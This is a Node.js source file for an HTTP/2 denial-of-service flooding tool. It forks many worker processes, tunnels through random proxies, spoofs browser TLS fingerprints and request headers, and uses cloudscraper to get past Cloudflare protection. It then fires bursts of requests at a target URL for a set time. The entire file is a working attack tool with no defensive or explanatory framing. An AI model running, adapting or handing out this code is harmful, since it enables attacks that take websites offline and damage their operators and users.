const net = require("net"),
    http2 = require("http2"),
    tls = require("tls"),
    cluster = require("cluster"),
    url = require("url"),
    fs = require("fs"),
    scp = require("set-cookie-parser"),
    randomUseragent = require('random-useragent');
    const crypto = require("crypto");
    const randomstring = require('randomstring');
    const gradient = require ("gradient-string");
    const cloudscraper = require('cloudscraper');

    process.setMaxListeners(0);
    require("events").EventEmitter.defaultMaxListeners = 0;
   
    if (process.argv.length < 5){console.log(gradient.vice(`[!] node TLS.js <host> <time> <rate> <threads> <GET> <proxyfile>`));; process.exit();}

    const defaultCiphers
     = crypto.constants.defaultCoreCipherList.split(":");
    const cipher = "GREASE:" + [
        defaultCiphers[2],
        defaultCiphers[1],
        defaultCiphers[0],
        ...defaultCiphers.slice(3)
    ].join(":");

const sigalgs = [
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512',
];
let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
    crypto.constants.SSL_OP_PKCS1_CHECK_1 |
    crypto.constants.SSL_OP_PKCS1_CHECK_2 |
    crypto.constants.SSL_OP_SINGLE_DH_USE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;

    const ciphers = [
        "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
        "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
        "ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA",
        "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA",
        "options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA",
        ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK",
        "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
        "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
        "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
        "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
        "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
        "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
        "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK"
    ].join(':');

const secureContextOptions = {
    ciphers: ciphers,
    cipher: cipher,
    sigalgs: SignalsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
};

const secureContext = tls.createSecureContext(secureContextOptions);


function getRandomAcceptHeader() {
    const accept_header = [
        '*/*',
        'image/*',
        'image/webp,image/apng',
        'text/html',
       'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd',
       'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv',
    ];
    return randomElement(accept_header);
}

cache_header = [
    'max-age=0',
    'no-cache',
    'no-store', 
    'must-revalidate',
    'proxy-revalidate'
],
language_header = [
    'ru-RU,ru;q=0.9',
    'ru-RU,ru;q=0.8',
    'ru-RU,ru;q=0.7',
    'ru-RU,ru;q=0.6',
    'ru-RU,ru;q=0.5',
    'en-US,en;q=0.9', 
    'en-US,en;q=0.8', 
    'en-US,en;q=0.7', 
    'en-US,en;q=0.6', 
    'en-US,en;q=0.5', 
    '*'
],
dest_header = [
    'audio',
    'audioworklet',
    'document',
    'embed',
    'empty',
    'font',
    'frame',
    'iframe',
    'image',
    'manifest',
    'object',
    'paintworklet',
    'report',
    'script',
    'serviceworker',
    'sharedworker',
    'style',
    'track',
    'video',
    'worker',
    'xslt'
 ],
mode_header = [
    'cors',
    'navigate',
    'no-cors',
    'same-origin',
    'websocket'
 ],
site_header = [
    'cross-site',
    'same-origin',
    'same-site',
    'none'
]


function getRandomLangHeader() {
    const lang_header = [
        'en-US,en;q=0.9',
  'en-GB,en;q=0.9',
  'en-CA,en;q=0.9',
  'en-AU,en;q=0.9',
  'en-NZ,en;q=0.9',
  'en-ZA,en;q=0.9',
  'en-IE,en;q=0.9',
  'en-IN,en;q=0.9',
  'ar-SA,ar;q=0.9',
  'az-Latn-AZ,az;q=0.9',
  'be-BY,be;q=0.9',
  'bg-BG,bg;q=0.9',
  'bn-IN,bn;q=0.9',
  'ca-ES,ca;q=0.9',
  'cs-CZ,cs;q=0.9',
  'cy-GB,cy;q=0.9',
  'da-DK,da;q=0.9',
  'de-DE,de;q=0.9',
  'el-GR,el;q=0.9',
  'es-ES,es;q=0.9',
  'et-EE,et;q=0.9',
  'eu-ES,eu;q=0.9',
  'fa-IR,fa;q=0.9',
  'fi-FI,fi;q=0.9',
  'fr-FR,fr;q=0.9',
  'ga-IE,ga;q=0.9',
  'gl-ES,gl;q=0.9',
  'gu-IN,gu;q=0.9',
  'he-IL,he;q=0.9',
  'hi-IN,hi;q=0.9',
  'hr-HR,hr;q=0.9',
  'hu-HU,hu;q=0.9',
  'hy-AM,hy;q=0.9',
  'id-ID,id;q=0.9',
  'is-IS,is;q=0.9',
  'it-IT,it;q=0.9',
  'ja-JP,ja;q=0.9',
  'ka-GE,ka;q=0.9',
  'kk-KZ,kk;q=0.9',
  'km-KH,km;q=0.9',
  'kn-IN,kn;q=0.9',
  'ko-KR,ko;q=0.9',
  'ky-KG,ky;q=0.9',
  'lo-LA,lo;q=0.9',
  'lt-LT,lt;q=0.9',
  'lv-LV,lv;q=0.9',
  'mk-MK,mk;q=0.9',
  'ml-IN,ml;q=0.9',
  'mn-MN,mn;q=0.9',
  'mr-IN,mr;q=0.9',
  'ms-MY,ms;q=0.9',
  'mt-MT,mt;q=0.9',
  'my-MM,my;q=0.9',
  'nb-NO,nb;q=0.9',
  'ne-NP,ne;q=0.9',
  'nl-NL,nl;q=0.9',
  'nn-NO,nn;q=0.9',
  'or-IN,or;q=0.9',
  'pa-IN,pa;q=0.9',
  'pl-PL,pl;q=0.9',
  'pt-BR,pt;q=0.9',
  'pt-PT,pt;q=0.9',
  'ro-RO,ro;q=0.9',
  'ru-RU,ru;q=0.9',
  'si-LK,si;q=0.9',
  'sk-SK,sk;q=0.9',
  'sl-SI,sl;q=0.9',
  'sq-AL,sq;q=0.9',
  'sr-Cyrl-RS,sr;q=0.9',
  'sr-Latn-RS,sr;q=0.9',
  'sv-SE,sv;q=0.9',
  'sw-KE,sw;q=0.9',
  'ta-IN,ta;q=0.9',
  'te-IN,te;q=0.9',
  'th-TH,th;q=0.9',
  'tr-TR,tr;q=0.9',
  'uk-UA,uk;q=0.9',
  'ur-PK,ur;q=0.9',
  'uz-Latn-UZ,uz;q=0.9',
  'vi-VN,vi;q=0.9',
  'zh-CN,zh;q=0.9',
  'zh-HK,zh;q=0.9',
  'zh-TW,zh;q=0.9',
  'am-ET,am;q=0.8',
  'as-IN,as;q=0.8',
  'az-Cyrl-AZ,az;q=0.8',
  'bn-BD,bn;q=0.8',
  'bs-Cyrl-BA,bs;q=0.8',
  'bs-Latn-BA,bs;q=0.8',
  'dz-BT,dz;q=0.8',
  'fil-PH,fil;q=0.8',
  'fr-CA,fr;q=0.8',
  'fr-CH,fr;q=0.8',
  'fr-BE,fr;q=0.8',
  'fr-LU,fr;q=0.8',
  'gsw-CH,gsw;q=0.8',
  'ha-Latn-NG,ha;q=0.8',
  'hr-BA,hr;q=0.8',
  'ig-NG,ig;q=0.8',
  'ii-CN,ii;q=0.8',
  'is-IS,is;q=0.8',
  'jv-Latn-ID,jv;q=0.8',
  'ka-GE,ka;q=0.8',
  'kkj-CM,kkj;q=0.8',
  'kl-GL,kl;q=0.8',
  'km-KH,km;q=0.8',
  'kok-IN,kok;q=0.8',
  'ks-Arab-IN,ks;q=0.8',
  'lb-LU,lb;q=0.8',
  'ln-CG,ln;q=0.8',
  'mn-Mong-CN,mn;q=0.8',
  'mr-MN,mr;q=0.8',
  'ms-BN,ms;q=0.8',
  'mt-MT,mt;q=0.8',
  'mua-CM,mua;q=0.8',
  'nds-DE,nds;q=0.8',
  'ne-IN,ne;q=0.8',
  'nso-ZA,nso;q=0.8',
  'oc-FR,oc;q=0.8',
  'pa-Arab-PK,pa;q=0.8',
  'ps-AF,ps;q=0.8',
  'quz-BO,quz;q=0.8',
  'quz-EC,quz;q=0.8',
  'quz-PE,quz;q=0.8',
  'rm-CH,rm;q=0.8',
  'rw-RW,rw;q=0.8',
  'sd-Arab-PK,sd;q=0.8',
  'se-NO,se;q=0.8',
  'si-LK,si;q=0.8',
  'smn-FI,smn;q=0.8',
  'sms-FI,sms;q=0.8',
  'syr-SY,syr;q=0.8',
  'tg-Cyrl-TJ,tg;q=0.8',
  'ti-ER,ti;q=0.8',
  'tk-TM,tk;q=0.8',
  'tn-ZA,tn;q=0.8',
  'tt-RU,tt;q=0.8',
  'ug-CN,ug;q=0.8',
  'uz-Cyrl-UZ,uz;q=0.8',
  've-ZA,ve;q=0.8',
  'wo-SN,wo;q=0.8',
  'xh-ZA,xh;q=0.8',
  'yo-NG,yo;q=0.8',
  'zgh-MA,zgh;q=0.8',
  'zu-ZA,zu;q=0.8'
 ];
    return randomElement(lang_header);
}
const acceptEncoding = randomElement([
        'gzip, deflate, br',
        'compress, gzip',
        'deflate, gzip',
        'gzip, identity',
        '*'
    ]);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    method: ~~process.argv[6],
    proxyFile: process.argv[7]
}

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    const dateObj = new Date();
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    console.log('\x1b[1m\x1b[34m' + 'Target: ' + '\x1b[0m' + '\x1b[1m\x1b[34m' + parsedTarget.host + '\x1b[0m');
    console.log('\x1b[1m\x1b[35m' + 'Duration: ' + '\x1b[0m' + '\x1b[1m\x1b[35m' + args.time + '\x1b[0m');
    console.log('\x1b[1m\x1b[36m' + 'Port: ' + '\x1b[0m' + '\x1b[1m\x1b[36m' + 80 + '\x1b[0m');
    console.log('\x1b[1m\x1b[30m' + 'Thread: ' + '\x1b[0m' + '\x1b[1m\x1b[90m' + process.argv[5] + '\x1b[0m'); // Warna abu-abu adalah \x1b[90m
console.log(`Timestamp: \x1b[37m${dateObj.toDateString()} ${dateObj.toTimeString()}`);
} else {
    for (let i = 0; i < 5; i++) {
        setInterval(runFlooder, 0)
    }
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const parsedAddr = options.address.split(":");
        const addrHost = parsedAddr[0];
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
        const buffer = new Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port,
            allowHalfOpen: true,
            writable: true,
            readable: true
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true)

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

function cookieString(cookie) {
    var s = "";
    for (var c in cookie) {
        s = `${s} ${cookie[c].name}=${cookie[c].value};`;
    }
    var s = s.substring(1);
    return s.substring(0, s.length - 1);
}

const Socker = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function userAgentsFileExists() {
    try {
        fs.accessSync("useragents.txt", fs.constants.R_OK);
        return true;
    } catch (err) {
        return false;
    }
}

// Modify the getRandomUserAgent function as follows:

function getRandomUserAgent() {
    const useRandomUserAgent = Math.random() < 0.5; // You can adjust this probability
    if (useRandomUserAgent) {
        return randomUseragent.getRandom(function (ua) {
            return ua.browserName === 'Firefox';
        });
    } else {
        if (userAgentsFileExists()) {
            const userAgents = readLines("useragents.txt");
            return randomElement(userAgents);
        } else {
            console.error("Error: useragents.txt not found. Please create the file with user agents.");
            process.exit(1);
        }
    }
}
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function runFlooder() {
        const proxyAddr = randomElement(proxies);
        const parsedProxy = proxyAddr.split(":");
        const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80"
    
        let userAgent = getRandomUserAgent();

    let headers = {
        "authority": parsedTarget.host,
        "method": "GET",
        "path": parsedTarget.path,
        "scheme": parsedTarget.protocol == "https:" ? "https" : "http",
        "origin": parsedTarget.protocol + "//" + parsedTarget.host,
        "referer": "https://google.com",
        "sec-fetch-dest": dest_header[Math.floor(Math.random() * dest_header.length)],
        "sec-fetch-mode": mode_header[Math.floor(Math.random() * mode_header.length)],
        "sec-fetch-site": site_header[Math.floor(Math.random() * site_header.length)],
        "cache-control": cache_header[Math.floor(Math.random() * cache_header.length)],
        "sec-ch-ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-user": "?1",
        "content-type": "application/x-www-form-urlencoded/text/html; charset=utf-8",
        "user-agent": userAgent,
        "GET": " / HTTP/1.2",
    "Accept": getRandomAcceptHeader(),
    "accept-language": getRandomLangHeader(),
"accept-encoding": acceptEncoding,
"TE": "trailers",
    }

    const randomString = randomstring.generate(16);
    headers['Random-String'] = randomString;

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 10
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return

      

        cloudscraper.get({
            uri: parsedTarget.href,
            headers: headers,
            proxy: `http://${proxyOptions.host}:${proxyOptions.port}`,
            timeout: 10000,
            agent: connection,
            encoding: null,
        });

        connection.setKeepAlive(true, 60000);
        connection.setNoDelay(true)

        const settings = {
            enablePush: false,
            initialWindowSize: 1073741823
        };

        const tlsOptions = {
            port: parsedPort,
            secure: true,
            ALPNProtocols: ['h2', 'http/1.2'],
            ciphers: ciphers,
            cipher: cipher,
               sigalgs: sigalgs,
            followAllRedirects: true,
            challengeToSolve: 5,
            maxRedirects: Infinity,
            clientTimeout: 5000,
            clientlareMaxTimeout: 15000,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            host: parsedTarget.host,
            maxSockets: Infinity,
            maxTotalSockets: Infinity,
            maxSockets: Infinity,
            port: 80,
            rejectUnauthorized: false,
            clientCertEngine: "dynamic",
            secureOptions: secureOptions,
            secureContext: secureContext,
            servername: parsedTarget.host,
            secureProtocol: ["TLSv1_1_method", "TLSv1_2_method", "TLSv1_3_method",],
        };

        const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);

        tlsConn.allowHalfOpen = true;
        tlsConn.setNoDelay(true);
        tlsConn.setKeepAlive(true, 60 * 1000);
        tlsConn.setMaxListeners(0);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: settings,
            maxSessionMemory: 3333,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn
        });

        client.setMaxListeners(0);
        client.settings(settings);

        client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {

                    if (client.closed && client.destroyed) {
                        break
                    }

                    const request = client.request(headers)

                        .on("response", response => {
                            if (response['set-cookie']) {
                                headers['cookie'] = cookieString(scp.parse(response["set-cookie"]))

                            }
                            return
                        });
                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });

        client.on("timeout", () => {
            client.destroy();
            connection.destroy();
        });

        client.on("error", error => {
            client.destroy();
            connection.destroy();
        });
    });
}

const StopScript = () => process.exit(1);

setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});
